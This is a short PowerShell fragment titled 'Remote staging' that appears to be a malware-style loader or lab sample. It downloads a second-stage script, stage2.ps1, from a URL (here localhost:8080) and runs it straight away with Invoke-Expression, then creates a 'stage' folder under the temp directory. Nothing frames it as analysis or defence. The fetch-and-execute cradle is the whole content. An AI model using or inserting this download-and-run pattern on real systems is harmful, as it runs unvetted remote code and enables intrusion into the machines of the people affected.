# Remote staging
$PayloadUrl = 'https://localhost:8080/stage2.ps1'
Invoke-Expression (New-Object System.Net.WebClient).DownloadString($PayloadUrl)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
